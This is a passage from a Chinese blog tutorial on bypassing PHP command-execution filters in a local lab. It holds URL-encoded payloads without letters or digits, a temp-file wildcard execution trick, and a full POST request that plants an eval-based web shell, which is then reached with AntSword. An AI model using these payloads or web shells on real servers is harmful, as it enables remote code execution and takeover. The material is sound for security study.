B%24__%3D%24___%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%24____%20.%3D%24__%3B%24__%3D%24___%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%24____%20.%3D%24__%3B%24__%3D%24___%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%24____%20.%3D%24__%3B%24__%3D%24___%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%24____%20.%3D%24__%3B%24__%3D%24%24____%3B%24_(%24__%5B_%5D)%3B</span><br></pre></td></tr></table></figure>

<p><img src="/../picture/image-20250427213051453.png" alt="image-20250427213051453"></p>
<h3 id="PHP7-2"><a href="#PHP7-2" class="headerlink" title="PHP7"></a>PHP7</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">`$_POST[_]`    $___</span><br><span class="line">_POST-&gt;</span><br><span class="line">$_=[].&#x27;&#x27;;$___=$_[$__];$__=$___;$_=$___;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;$____ = &quot;_&quot;;$__=$___;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;$____ .=$__;$__=$___;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;$____ .=$__;$__=$___;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;$____ .=$__;$__=$___;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;$____ .=$__;</span><br></pre></td></tr></table></figure>

<p><img src="/../picture/image-20250427214002561.png" alt="image-20250427214002561"></p>
<p><img src="/../picture/image-20250427214015482.png" alt="image-20250427214015482"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">`$_POST[_]`</span><br><span class="line">$_=[].&#x27;&#x27;;$___=$_[$__];$__=$___;$_=$___;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;$____ = &quot;_&quot;;$__=$___;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;$____ .=$__;$__=$___;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;$____ .=$__;$__=$___;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;$____ .=$__;$__=$___;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;$____ .=$__;$_=$$____;`$_`;</span><br><span class="line">?cmd=$_=[].&#x27;&#x27;;$___=$_[$__];$__=$___;$_=$___;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;$____ = &quot;_&quot;;$__=$___;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;$____ .=$__;$__=$___;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;$____ .=$__;$__=$___;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;$____ .=$__;$__=$___;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;$____ .=$__;$_=$$____;`$_[_]`;</span><br></pre></td></tr></table></figure>

<p>urlencode</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=%24_%3D%5B%5D.&#x27;&#x27;%3B%24___%3D%24_%5B%24__%5D%3B%24__%3D%24___%3B%24_%3D%24___%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%24____%20%3D%20%22_%22%3B%24__%3D%24___%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%24____%20.%3D%24__%3B%24__%3D%24___%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%24____%20.%3D%24__%3B%24__%3D%24___%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%24____%20.%3D%24__%3B%24__%3D%24___%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%24____%20.%3D%24__%3B%24_%3D%24%24____%3B%60%24_%5B_%5D%60%3B</span><br></pre></td></tr></table></figure>

<p><img src="/../picture/image-20250427214451152.png" alt="image-20250427214451152"></p>
<h2 id="0x23无字母数字特殊符号过滤-php7"><a href="#0x23无字母数字特殊符号过滤-php7" class="headerlink" title="0x23无字母数字特殊符号过滤(php7)"></a>0x23无字母数字特殊符号过滤(php7)</h2><h3 id="无字母数字下划线"><a href="#无字母数字下划线" class="headerlink" title="无字母数字下划线"></a>无字母数字下划线</h3><p><img src="/../picture/image-20250429205338573.png" alt="image-20250429205338573"></p>
<p>短标签</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?= phpinfo();?&gt;</span><br></pre></td></tr></table></figure>

<p>GET方式提交</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?&gt;&lt;?=`&#123;$&#123;~&quot;%a0%b8%ba%ab&quot;&#125;[%a0]&#125;`?&gt;   -&gt;   ?&gt;&lt;?=`$_GET[%a0]`?&gt;   取反</span><br><span class="line">?cmd=?&gt;&lt;?=`&#123;$&#123;~&quot;%a0%b8%ba%ab&quot;&#125;[%a0]&#125;`?&gt;&amp;%a0=ls</span><br></pre></td></tr></table></figure>

<p><img src="/../picture/image-20250429210335757.png" alt="image-20250429210335757"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?&gt;&lt;?=`&#123;$&#123;~&quot;%a0%af%b0%ac%ab&quot;&#125;[&quot;-&quot;]&#125;`?&gt;   -&gt;   ?&gt;&lt;?`$_POST[-]`?&gt;   取反</span><br><span class="line">?cmd=?&gt;&lt;?=`&#123;$&#123;~&quot;%a0%af%b0%ac%ab&quot;&#125;[&quot;-&quot;]&#125;`?&gt;</span><br><span class="line">POST:   -=ls</span><br></pre></td></tr></table></figure>

<p><img src="/../picture/image-20250429210803038.png" alt="image-20250429210803038"></p>
<h3 id="无字母数字下划线及-符号过滤"><a href="#无字母数字下划线及-符号过滤" class="headerlink" title="无字母数字下划线及$符号过滤"></a>无字母数字下划线及$符号过滤</h3><h4 id="PHP7-3"><a href="#PHP7-3" class="headerlink" title="PHP7"></a>PHP7</h4><p>($a)()  式执行</p>
<p>利用call_user_func()  函数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">call_user_func()  -&gt;%9c%9e%93%93%a0%8a%8c%9a%8d%a0%99%8a%91%9c</span><br><span class="line">system  -&gt;  %8c%86%8c%8b%9a%92</span><br><span class="line">ls / -&gt;%93%8c</span><br><span class="line">?cmd=(~%9c%9e%93%93%a0%8a%8c%9a%8d%a0%99%8a%91%9c)(~%8c%86%8c%8b%9a%92,~%93%8c,&#x27;&#x27;);</span><br></pre></td></tr></table></figure>

<p><img src="/../picture/image-20250429211443415.png" alt="image-20250429211443415"></p>
<h4 id="PHP5-3"><a href="#PHP5-3" class="headerlink" title="PHP5"></a>PHP5</h4><p>文化读取</p>
<p>php中POST上传文件会把我们上传的文件暂时存在&#x2F;tmp目录下</p>
<p>默认文件名是phpxxxxxx，文件名最后6个字符是随机的大小写字母。</p>
<p>. &#x2F;???&#x2F;?????????   ?通配符，可以匹配到. &#x2F;tmp&#x2F;phpxxxxxx    能匹配东西太多，通常会报错</p>
<p>. &#x2F;???&#x2F;????????[@-[]   [@-[]表示ASCII在@和[之间的字符，也就是大写字母，保障最后一位为大写字母</p>
<p>一：先构造一个文件上传的POST数据包</p>
<p>二：PHP页面生成临时文件phpxxxxxx，存储在&#x2F;tmp目录下；</p>
<p>三：执行指令. &#x2F;???&#x2F;????????[@-[],  读取文件，执行其中指令；</p>
<p>四：在上传的文件中写入一句话木马，把木马生成位置知道一个绝对路径，直接执行：</p>
<p>在docker内监控文件</p>
<p>&#x2F;tmp# inotifywait -m &#x2F;tmp&#x2F;</p>
<p>bp修改数据包</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=?&gt;&lt;?=`.+/???/????????[@-[]`;?&gt;</span><br></pre></td></tr></table></figure>

<p>数据包不知道是什么可以通过下面这个网页传</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action=&quot;http://192.168.248.130:18080/class11/3.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">&lt;!--链接是当前打开的题目链接--&gt;</span><br><span class="line">    &lt;label for=&quot;file&quot;&gt;文件名：&lt;/label&gt;</span><br><span class="line">    &lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot;&gt;&lt;br&gt;</span><br><span class="line">    &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;提交&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>保存为  .html文件  用浏览器打开</p>
<p><img src="/../picture/image-20250429214636196.png" alt="image-20250429214636196"></p>
<p>随便提交一个文件   用burpsuite进行抓包  然后再去修改文件内容就行了</p>
<p><img src="/../picture/image-20250429220014180.png" alt="image-20250429220014180"></p>
<p><img src="/../picture/image-20250429214954630.png" alt="image-20250429214954630"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">POST /class11/3.php?cmd=?%3e%3c?=`.+/%3f%3f%3f%2f%3f%3f%3f%3f%3f%3f%3f%3f[%40-[]`%3b?%3e HTTP/1.1</span><br><span class="line">Host: 192.168.248.130:18080</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:137.0) Gecko/20100101 Firefox/137.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Content-Type: multipart/form-data; boundary=----geckoformboundary5c8c61eebe5106b8d9a04d026213a5e3</span><br><span class="line">Content-Length: 416</span><br><span class="line">Origin: null</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Priority: u=0, i</span><br><span class="line"></span><br><span class="line">------geckoformboundary5c8c61eebe5106b8d9a04d026213a5e3</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;shell.txt&quot;</span><br><span class="line">Content-Type: image/jpeg</span><br><span class="line"></span><br><span class="line">echo &quot;&lt;?php eval(\$_POST[&#x27;shell&#x27;]);&quot;?\&gt; &gt;/www/admin/localhost_80/wwwroot/class11/shell.php</span><br><span class="line">------geckoformboundary5c8c61eebe5106b8d9a04d026213a5e3</span><br><span class="line">Content-Disposition: form-data; name=&quot;submit&quot;</span><br><span class="line"></span><br><span class="line">提交</span><br><span class="line">------geckoformboundary5c8c61eebe5106b8d9a04d026213a5e3--</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/../picture/image-20250429215028692.png" alt="image-20250429215028692"></p>
<p>这里发现已经写入成功了</p>
<p><img src="/../picture/image-20250429220028405.png" alt="image-20250429220028405"></p>
<p>下面可以用antsword连接</p>
<p><img src="/../picture/image-20250429220105762.png" alt="image-20250429220105762"></p>
<h3 id="无字母数字过滤"><a href="#无字母数字过滤" class="headerlink" title="无字母数字过滤;~^&#96;&amp;|"></a>无字母数字过滤;~^&#96;&amp;|</h3><p><img src="/../picture/Screenshot_20250429_220158.jpg" alt="Screenshot_20250429_220158"></p>
<p><img src="/../picture/Screenshot_20250429_220201.jpg" alt="Screenshot_20250429_220201"></p>

      
    </div>
    <footer class="article-footer">
      
      
      
      
      
      
      
      
      

    </footer>
  </div>
  
  <nav id="article-nav" data-aos="fade-up">
    
      
      <div class="article-nav-link-wrap article-nav-link-left">
        
          <img data-src="/../covers/3.jpg" data-sizes="auto" alt="ssti模板注入" class="lazyload">
        
        <a href="/2025/05/27/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/"></a>
        <div class="article-nav-caption">前一篇</div>
        <h3 class="article-nav-title">
          
            ssti模板注入
          
        </h3>
      </div>
    
    
    
    <div class="article-nav-link-wrap article-nav-link-right">
      
        <img data-src="/../covers/9.jpg" data-sizes="auto" alt="TGCTF web" class="lazyload">
      
      <a href="/2025/04/15/TGCTF/"></a>
      <div class="article-nav-caption">后一篇</div>
      <h3 class="article-nav-title">
        
          TGCTF web
        
      </h3>
    </div>
    
  </nav>


</article>










</section>
        </div>
        <footer id="footer">
  <div style="width: 100%; overflow: hidden">
    <div class="footer-line"></div>
  </div>
  <div id="footer-info">
    
    <div>
      <span class="icon-copyright"></span>
      
      
      
        2020-2025
      
      <span class="footer-info-sep rotate"></span>
      达达
    </div>
    
      <div>
        基于&nbsp;<a href="https://hexo.io/" rel="noopener external nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener external nofollow noreferrer" target="_blank">Reimu</a>
      </div>
    
    
      <div>
        <span class="icon-brush"></span>
        45k
        &nbsp;|&nbsp;
        <span class="icon-coffee"></span>
        03:13
      </div>
    
    
    
    
      <div>
        <span class="icon-eye"></span>
        <span id="busuanzi_container_site_pv">总访问量&nbsp;<span id="busuanzi_value_site_pv"></span></span>
        &nbsp;|&nbsp;
        <span class="icon-user"></span>
        <span id="busuanzi_container_site_uv">总访客量&nbsp;<span id="busuanzi_value_site_uv"></span></span>
      </div>
    
  </div>
</footer>

        
          <div class="sidebar-top">
            <div class="sidebar-top-taichi rotate"></div>
            <div class="arrow-up"></div>
          </div>
        
        <div id="mask" class="hide"></div>
      </div>
      <nav id="mobile-nav">
  <div class="sidebar-wrap">
    
      
        <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
  <h3 class="toc-title">文章目录</h3>
  <div class="sidebar-toc-wrapper toc-div-class" >
      
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.</span> <span class="toc-text">0x01命令执行函数介绍</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#system-%E6%9C%89%E5%9B%9E%E6%98%BE"><span class="toc-number">1.1.</span> <span class="toc-text">system  有回显</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exec-%E5%9B%9E%E6%98%BE%E6%9C%80%E5%90%8E%E4%B8%80%E8%A1%8C"><span class="toc-number">1.2.</span> <span class="toc-text">exec  回显最后一行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#passthru-%E6%9C%89%E5%9B%9E%E6%98%BE"><span class="toc-number">1.3.</span> <span class="toc-text">passthru   有回显</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#shell-exec-%E6%97%A0%E5%9B%9E%E6%98%BE"><span class="toc-number">1.4.</span> <span class="toc-text">shell_exec  无回显</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#popen-%E6%97%A0%E5%9B%9E%E6%98%BE"><span class="toc-number">1.5.</span> <span class="toc-text">popen  无回显</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#command"><span class="toc-number">1.6.</span> <span class="toc-text">command</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#proc-open-%E6%97%A0%E5%9B%9E%E6%98%BE"><span class="toc-number">1.7.</span> <span class="toc-text">proc_open  无回显</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02%E6%9B%BF%E6%8D%A2%E7%BB%95%E8%BF%87%E5%87%BD%E6%95%B0%E8%BF%87%E6%BB%A4-%E8%BF%87"><span class="toc-number">2.</span> <span class="toc-text">0x02替换绕过函数过滤(过)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03LD-PRELOAD%E7%BB%95%E8%BF%87"><span class="toc-number">3.</span> <span class="toc-text">0x03LD_PRELOAD绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04mail-%E5%87%BD%E6%95%B0%E5%91%BD%E4%BB%A4"><span class="toc-number">4.</span> <span class="toc-text">0x04mail()函数命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05%E8%9A%81%E5%89%91%E5%8F%8Apcntl%E7%BB%95%E8%BF%87%E5%87%BD%E6%95%B0%E8%BF%87%E6%BB%A4"><span class="toc-number">5.</span> <span class="toc-text">0x05蚁剑及pcntl绕过函数过滤</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#antsword"><span class="toc-number">5.1.</span> <span class="toc-text">antsword</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pcntl-exec"><span class="toc-number">5.2.</span> <span class="toc-text">pcntl_exec</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E9%93%BE%E6%8E%A5%E7%AC%A6"><span class="toc-number">6.</span> <span class="toc-text">0x06操作系统链接符</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">6.1.</span> <span class="toc-text">;</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#URL%E7%BC%96%E7%A0%81-26"><span class="toc-number">6.2.</span> <span class="toc-text">&amp;   URL编码  %26</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#-1"><span class="toc-number">6.3.</span> <span class="toc-text">|</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#-2"><span class="toc-number">6.4.</span> <span class="toc-text">||</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x07-%E7%A9%BA%E6%A0%BC%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87"><span class="toc-number">7.</span> <span class="toc-text">0x07.空格过滤绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%A4%A7%E6%8B%AC%E5%8F%B7-car-flag-txt"><span class="toc-number">7.1.</span> <span class="toc-text">1.大括号{car,flag.txt};</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-IFS%E4%BB%A3%E6%9B%BF%E7%A9%BA%E6%A0%BC%EF%BC%9B-IFS%E3%80%81-IFS-%E3%80%81-IFS-9"><span class="toc-number">7.2.</span> <span class="toc-text">2.$IFS代替空格；$IFS、${IFS}、$IFS$9</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E9%87%8D%E5%AE%9A%E5%90%91%E5%AD%97%E7%AC%A6"><span class="toc-number">7.3.</span> <span class="toc-text">3.重定向字符 &lt;, &lt;&gt;;</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-09-Tab-20-space"><span class="toc-number">7.4.</span> <span class="toc-text">4.%09(Tab),%20(space);</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x08-%E6%96%87%E4%BB%B6%E5%90%8D%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87"><span class="toc-number">8.</span> <span class="toc-text">0x08.文件名过滤绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E9%80%9A%E9%85%8D%E7%AC%A6-%E7%BB%95%E8%BF%87"><span class="toc-number">8.1.</span> <span class="toc-text">1.通配符  ?  * 绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%8D%95%E5%BC%95%E5%8F%B7%E3%80%81%E5%8F%8C%E5%BC%95%E5%8F%B7%E7%BB%95%E8%BF%87"><span class="toc-number">8.2.</span> <span class="toc-text">2.单引号、双引号绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E5%8F%8D%E6%96%9C%E6%9D%A0-%E7%BB%95%E8%BF%87"><span class="toc-number">8.3.</span> <span class="toc-text">3.反斜杠  \   绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E7%89%B9%E6%AE%8A%E5%8F%98%E9%87%8F-1%E5%88%B0-9%E3%80%81-%E5%92%8C-%E7%AD%89"><span class="toc-number">8.4.</span> <span class="toc-text">4.特殊变量:  $1到$9、$@和$*等</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E5%86%85%E8%81%94%E6%89%A7%E8%A1%8C"><span class="toc-number">8.5.</span> <span class="toc-text">5.内联执行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-%E5%88%A9%E7%94%A8linux%E4%B8%AD%E7%9A%84%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F"><span class="toc-number">8.6.</span> <span class="toc-text">6.利用linux中的环境变量</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x09-%E5%B8%B8%E8%A7%81%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E7%9B%AE%E5%BD%95%E7%BB%95%E8%BF%87"><span class="toc-number">8.7.</span> <span class="toc-text">0x09.常见文件读取目录绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-tac%EF%BC%9A%E5%8F%8D%E5%90%91%E6%98%BE%E7%A4%BA"><span class="toc-number">8.8.</span> <span class="toc-text">1.tac：反向显示</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-more-%E4%B8%80%E9%A1%B5%E4%B8%80%E9%A1%B5%E7%9A%84%E6%98%BE%E7%A4%BA%E6%A1%A3%E6%A1%88%E5%86%85%E5%AE%B9"><span class="toc-number">8.9.</span> <span class="toc-text">2.more:一页一页的显示档案内容</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-less%EF%BC%9A%E4%B8%8Emore%E7%B1%BB%E4%BC%BC"><span class="toc-number">8.10.</span> <span class="toc-text">3.less：与more类似</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-tail%EF%BC%9A%E6%9F%A5%E7%9C%8B%E6%9C%AB%E5%B0%BE%E5%87%A0%E8%A1%8C%EF%BC%9B"><span class="toc-number">8.11.</span> <span class="toc-text">4.tail：查看末尾几行；</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-nl%EF%BC%9A%E6%98%BE%E7%A4%BA%E7%9A%84%E6%97%B6%E5%80%99%EF%BC%8C%E9%A1%BA%E4%BE%BF%E8%BE%93%E5%87%BA%E8%A1%8C%E5%8F%B7"><span class="toc-number">8.12.</span> <span class="toc-text">5.nl：显示的时候，顺便输出行号</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-od%EF%BC%9A%E4%BB%A5%E4%BA%8C%E8%BF%9B%E5%88%B6%E7%9A%84%E6%96%B9%E5%BC%8F%E8%AF%BB%E5%8F%96%E6%A1%A3%E6%A1%88%E5%86%85%E5%AE%B9%EF%BC%9B"><span class="toc-number">8.13.</span> <span class="toc-text">6.od：以二进制的方式读取档案内容；</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-xxd%EF%BC%9A%E8%AF%BB%E5%8F%96%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%96%87%E4%BB%B6"><span class="toc-number">8.14.</span> <span class="toc-text">7.xxd：读取二进制文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-sort%EF%BC%9A%E4%B8%BB%E8%A6%81%E7%94%A8%E4%BA%8E%E6%8E%92%E5%BA%8F%E6%96%87%E4%BB%B6%EF%BC%9B"><span class="toc-number">8.15.</span> <span 